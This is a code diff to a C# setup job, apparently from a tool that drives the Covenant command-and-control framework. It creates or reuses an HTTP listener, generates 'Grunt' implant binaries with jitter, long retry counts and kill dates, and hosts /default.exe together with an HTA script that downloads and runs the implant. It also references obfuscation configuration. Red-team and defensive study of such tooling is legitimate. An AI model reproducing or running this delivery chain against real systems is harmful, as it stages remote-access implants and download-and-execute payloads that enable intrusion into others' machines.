@@ -25,48 +25,41 @@ namespace Scorpion.Jobs
 {
   public class SetupJob : Job
   {
-    public int TargetPort = 8080;
+    public int DefaultTargetPort = 8080;
 
     public string TargetDefaultHttpTemplate = "GruntHTTP";
     public string TargetDefaultSmbTemplate = "GruntSMB";
 
     public SetupJob(IConsole console, CovenantAPI api) : base(console, api) { }
 
-    public async Task<int> RunAsync(string connectAddress)
+    public async Task<int> RunAsync(string listenerName, string connectAddress, int connectPort)
     {
+      var request = new RequestBuilder(Api);
+
       Console.WriteLine("Creating Data directories");
       var pwd = Directory.GetCurrentDirectory();
       var dataDir = Path.Join(pwd, "Data");
       if (!Directory.Exists(dataDir)) {
         Directory.CreateDirectory(dataDir);
       }
-      Console.WriteLine("Creating Listener");
-      HttpListener listener = await CreateListener(connectAddress);
+
+      HttpListener listener = await FindOrCreateListener(listenerName, connectAddress, connectPort);
+      Console.WriteLine($"Using listener {listener.Id} - {listener.Name}");
       Console.WriteLine("Creating Basic HTTP Grunt Binary");
-      BinaryLauncher defaultHttpLauncher = await GenerateBasicHttpGruntBinary(listener);
-      var rawBin = Convert.FromBase64String(defaultHttpLauncher.Base64ILByteString);
+
+      BinaryLauncher binaryLauncher = await GenerateBasicHttpGruntBinary(listener);
+      Console.WriteLine($"Using Binary Launcher {binaryLauncher.Name} - {binaryLauncher.Id}");
       var defaultHttpBinPath = Path.Join(dataDir, "default.exe");
       Console.WriteLine("Saving HTTP Grunt Binary");
-      File.WriteAllBytes(defaultHttpBinPath, rawBin);
-      Console.WriteLine("Creating Hosted HTTP Grunt Binary");
-      var hostedDefaultHttpBin = new HostedFile();
-      hostedDefaultHttpBin.ListenerId = listener.Id;
-      hostedDefaultHttpBin.Path = "/default.exe";
-      //   b64 encoded
-      hostedDefaultHttpBin.Content = defaultHttpLauncher.Base64ILByteString;
-      var request = new RequestBuilder(Api);
-      Console.WriteLine("Creating Hosted HTTP Grunt Binary");
-      await request.CreateHostedFile((int)listener.Id, hostedDefaultHttpBin);
-      Console.WriteLine("Generating HTA Script That Dowloands/Execs Default Grunt Binary");
-      var htaToDownloadAndExecBin = GeneratePowershellBinaryPullAndExecCmd(listener, hostedDefaultHttpBin);
-      Console.WriteLine("Hosting HTA Script That Dowloands/Execs Default Grunt Binary");
-      var hostedHtaToDownloadAndExecBin = new HostedFile();
-      hostedHtaToDownloadAndExecBin.ListenerId = listener.Id;
-      hostedHtaToDownloadAndExecBin.Path = "/default.hta";
-      hostedHtaToDownloadAndExecBin.Content = Convert.ToBase64String(Encoding.ASCII.GetBytes(htaToDownloadAndExecBin));
+      File.WriteAllBytes(defaultHttpBinPath, Convert.FromBase64String(binaryLauncher.Base64ILByteString));
+
+      HostedFile hostedBinaryLauncher = await FindOrCreateHostedDefaultHttpGrunt(listener, binaryLauncher);
+
+      HostedFile hostedBinaryLauncherHta = await FindOrCreateHostedDefaultHttpGruntHta(listener, hostedBinaryLauncher);
+
       var defaultHttpHtaPath = Path.Join(dataDir, "default.hta");
       Console.WriteLine("Saving HTA Script That Dowloands/Execs Default Grunt Binary");
-      File.WriteAllBytes(defaultHttpHtaPath, Encoding.ASCII.GetBytes(htaToDownloadAndExecBin));
+      File.WriteAllBytes(defaultHttpHtaPath, Convert.FromBase64String(hostedBinaryLauncherHta.Content));
 
       for (int i = 0; i < 5; i++) {
         var aGuid = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
@@ -162,7 +155,99 @@ namespace Scorpion.Jobs
       return await Task.FromResult(0);
     }
 
-    public string GeneratePowershellBinaryPullAndExecCmd(HttpListener listener, HostedFile hostedFile)
+    public async Task<HostedFile> FindOrCreateHostedDefaultHttpGruntHta(HttpListener listener, HostedFile hostedBinaryFile)
+    {
+      var request = new RequestBuilder(Api);
+      Console.WriteLine("Checking a /default.hta Script is already hosted");
+      foreach (HostedFile aHostedFile in await request.GetHostedFiles((int)listener.Id)) {
+        if (aHostedFile.Path == "/default.hta") {
+          Console.WriteLine("Found existing /default.hta. Not creating a new one");
+          return aHostedFile;
+        }
+      }
+      Console.WriteLine("Generating HTA Script That Dowloands/Execs Default Grunt Binary");
+      var hta = GeneratePullAndExecBinaryHta(listener, hostedBinaryFile);
+      Console.WriteLine("Hosting HTA Script That Dowloands/Execs Default Grunt Binary");
+      var hostedHta = new HostedFile();
+      hostedHta.ListenerId = listener.Id;
+      hostedHta.Path = "/default.hta";
+      hostedHta.Content = Convert.ToBase64String(Encoding.ASCII.GetBytes(hta));
+      return await request.CreateHostedFile((int)listener.Id, hostedHta);
+    }
+    public async Task<HostedFile> FindOrCreateHostedDefaultHttpGrunt(HttpListener listener, BinaryLauncher launcher)
+    {
+      var request = new RequestBuilder(Api);
+      Console.WriteLine("Checking a /default.exe Grunt is already hosted");
+      foreach (HostedFile aHostedFile in await request.GetHostedFiles((int)listener.Id)) {
+        if (aHostedFile.Path == "/default.exe") {
+          Console.WriteLine("Found existing /default.exe. Not creating a new one");
+          return aHostedFile;
+        }
+      }
+      Console.WriteLine("Creating Hosted HTTP Grunt Binary");
+      var hostedDefaultHttpBin = new HostedFile();
+      hostedDefaultHttpBin.ListenerId = listener.Id;
+      hostedDefaultHttpBin.Path = "/default.exe";
+      hostedDefaultHttpBin.Content = launcher.Base64ILByteString; // b64 encoded
+      Console.WriteLine("Creating Hosted HTTP Grunt Binary");
+      return await request.CreateHostedFile((int)listener.Id, hostedDefaultHttpBin);
+    }
+    public async Task<HttpListener> FindOrCreateListener(string listenerName, string connectAddress, int connectPort)
+    {
+      var request = new RequestBuilder(Api);
+      if (!String.IsNullOrEmpty(listenerName)) {
+        Console.WriteLine($"Searching for existing listener with name {listenerName}");
+        var rootListener = await request.GetListenerByName(listenerName);
+        Console.WriteLine("Converting Listener to HTTPListener");
+        return await request.GetHttpListenerById((int)rootListener.Id);
+      } else if (!String.IsNullOrEmpty(connectAddress) && connectPort == 0) {
+        Console.WriteLine($"Searching for existing listener with connnect address {connectAddress}");
+        var listeners = await request.GetListeners();
+        foreach (Listener aListener in listeners) {
+          foreach (string c in aListener.ConnectAddresses) {
+            if (c.ToLower() == connectAddress) {
+              Console.WriteLine("Converting Listener to HTTPListener");
+              return await request.GetHttpListenerById((int)aListener.Id);
+            }
+          }
+        }
+      } else if (!String.IsNullOrEmpty(connectAddress) && connectPort > 0) {
+        Console.WriteLine($"Searching for existing listener with connnect address {connectAddress} and connect port {connectPort}");
+        var listeners = await request.GetListeners();
+        foreach (Listener aListener in listeners) {
+          foreach (string c in aListener.ConnectAddresses) {
+            if (c.ToLower() == connectAddress && aListener.ConnectPort == connectPort) {
+              Console.WriteLine("Converting Listener to HTTPListener");
+              return await request.GetHttpListenerById((int)aListener.Id);
+            }
+          }
+        }
+      } else if (connectPort > 0) {
+        Console.WriteLine($"Searching for existing listener with connect port {connectPort}");
+        var listeners = await request.GetListeners();
+        foreach (Listener aListener in listeners) {
+          foreach (string c in aListener.ConnectAddresses) {
+            if (aListener.ConnectPort == connectPort) {
+              Console.WriteLine("Converting Listener to HTTPListener");
+              return await request.GetHttpListenerById((int)aListener.Id);
+            }
+          }
+        }
+      }
+      if (!String.IsNullOrEmpty(connectAddress)) {
+        if (connectPort == 0) {
+          connectPort = DefaultTargetPort;
+          Console.WriteLine($"Using default port {connectPort} for new listener");
+
+        }
+        Console.WriteLine($"Creatiing listener with connnect address {connectAddress} and connect port {connectPort}");
+        return await CreateListener(connectAddress, connectPort);
+      }
+      Console.WriteLine("Please pass in a ConnectAddress to create a new listener or use an existing listener by name");
+      throw new AppException("Unable to find or create listener for setup");
+    }
+
+    public string GeneratePullAndExecBinaryHta(HttpListener listener, HostedFile hostedFile)
     {
       // TODO: make sure path starts with /
       var script = string.Format(@"
@@ -190,37 +275,45 @@ Write-Output ""Error"";
     public async Task<BinaryLauncher> GenerateBasicHttpGruntBinary(HttpListener listener)
     {
       var request = new RequestBuilder(Api);
-      var template = request.GetImplantTemplateByName(TargetDefaultHttpTemplate);
+      var template = await request.GetImplantTemplateByName(TargetDefaultHttpTemplate);
       var kd = new DateTime();
       kd.AddDays(60);
+      var aGuid = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
+
+      Console.WriteLine($"Generating Binary Launcher for template {template.Name}, listener {listener.Name} ({listener.Id})");
 
       var bin = new BinaryLauncher();
-      bin.ListenerId = listener.Id;
-      bin.Name = "DefaultHttpBin";
-      bin.Description = "Default HTTP Binary";
-      bin.DotNetFrameworkVersion = DotNetVersion.Net40;
+      // bin.Id = initializedLauncher.Id;
+
+      bin.ListenerId = (int)listener.Id;
       bin.Type = LauncherType.Binary;
       bin.ImplantTemplateId = template.Id;
+      bin.Name = "DefaultHttpBin-" + aGuid;
+      bin.Description = "Default HTTP Binary " + aGuid;
+      bin.DotNetFrameworkVersion = DotNetVersion.Net40;
       bin.ValidateCert = true;
       bin.UseCertPinning = true;
-      bin.SmbPipeName = "doesnotmatter";
+      bin.SmbPipeName = "doesnotmatter" + aGuid;
       bin.JitterPercent = 10;
       bin.Delay = 1;
       bin.ConnectAttempts = 5000;
       bin.KillDate = kd;
-      bin.LauncherString = "";
-      bin.StagerCode = "";
-      bin.Base64ILByteString = "";
+      // bin.LauncherString = "";
+      // bin.StagerCode = "";
+      // bin.Base64ILByteString = "";
       bin.OutputKind = OutputKind.ConsoleApplication;
       bin.CompressStager = true;
-      return await request.CreateBinaryLauncher(bin);
+      var l = await request.CreateBinaryLauncher(bin);
+
+      Console.WriteLine("Initializing Binary Launcher");
+      return await request.InitBinaryLauncher();
     }
 
 
     public async Task<BinaryLauncher> GenerateBasicSmbGruntBinary(string aGuid, HttpListener listener)
     {
       var request = new RequestBuilder(Api);
-      var template = request.GetImplantTemplateByName(TargetDefaultSmbTemplate);
+      var template = await request.GetImplantTemplateByName(TargetDefaultSmbTemplate);
       var kd = new DateTime();
       kd.AddDays(60);
 
@@ -238,41 +331,48 @@ Write-Output ""Error"";
       bin.Delay = 1;
       bin.ConnectAttempts = 5000;
       bin.KillDate = kd;
-      bin.LauncherString = "";
-      bin.StagerCode = "";
-      bin.Base64ILByteString = "";
+      // bin.LauncherString = "";
+      // bin.StagerCode = "";
+      // bin.Base64ILByteString = "";
       bin.OutputKind = OutputKind.ConsoleApplication;
       bin.CompressStager = true;
-      return await request.CreateBinaryLauncher(bin);
+      var b = await request.CreateBinaryLauncher(bin);
+      Console.WriteLine("Initializing Binary Launcher");
+      return await request.InitBinaryLauncher();
     }
 
-    public async Task<HttpListener> CreateListener(string connectAddress)
+    public async Task<HttpListener> CreateListener(string connectAddress, int connectPort)
     {
+      var request = new RequestBuilder(Api);
+
       var connectAddresses = new List<string>();
+      var profileName = "CustomHttpProfile";
+      var profile = await request.GetProfileByName(profileName);
+      var listenerTypeName = "HTTP";
+      var listenerType = await request.GetListenerTypeByName(listenerTypeName);
+
       connectAddresses.Add(connectAddress);
       var urls = new List<string>();
-      urls.Add($"http://{connectAddress}");
+      urls.Add($"http://{connectAddress}:{connectPort}");
 
-      return await new AddListenerJob(Console, Api).RunAsync(new
-      {
-        Name = "default",
-        Description = "Default Listener",
-        Guid = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10),
-        BindAddress = "0.0.0.0",
-        BindPort = TargetPort,
-        Urls = urls,
-        ConnectAddresses = connectAddresses,
-        ConnectPort = TargetPort,
-        ProfileId = 0,
-        ProfileName = "CustomHttpProfile",
-        ListenerTypeId = 0,
-        ListenerTypeName = "HTTP",
-        Status = "Active",
-        UseSSL = false,
-        SSLCertificate = "",
-        SSLCertificatePassword = "",
-        SSLCertificateHash = ""
-      });
+      HttpListener httpListener = new HttpListener();
+      httpListener.Name = "default";
+      httpListener.Description = "Default Listener";
+      httpListener.Guid = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
+      httpListener.BindAddress = "0.0.0.0";
+      httpListener.BindPort = connectPort;
+      httpListener.Urls = urls;
+      httpListener.ConnectAddresses = connectAddresses;
+      httpListener.ConnectPort = connectPort;
+      httpListener.ProfileId = (int)profile.Id;
+      httpListener.ListenerTypeId = (int)listenerType.Id;
+      httpListener.Status = ListenerStatus.Active;
+      httpListener.UseSSL = false;
+      httpListener.Validate();
+      Console.WriteLine("Creating listener...");
+      HttpListener listener = await request.CreateHttpListener(httpListener);
+      Console.WriteLine("Listener created");
+      return listener;
     }
 
     public string GenerateObfuscarFile(string aGuid, string projDir)
